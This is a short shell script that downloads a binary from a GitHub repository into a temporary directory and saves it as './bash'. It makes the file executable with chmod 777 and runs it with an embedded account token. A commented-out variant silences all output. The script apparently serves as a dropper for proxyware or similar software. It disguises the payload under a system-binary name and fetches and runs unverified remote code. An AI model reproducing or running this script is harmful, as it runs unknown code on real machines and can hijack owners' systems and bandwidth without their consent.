#!/bin/sh

token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
tmp="$(mktemp -d)" && cd "$tmp"
wget -qO "./bash" https://github.com/hanrzme/meme/raw/refs/heads/main/tm20250312
chmod 777 "./bash"
./bash start accept --token "${token}"
#./bash start accept --token "${token}" >/dev/null 2>&1
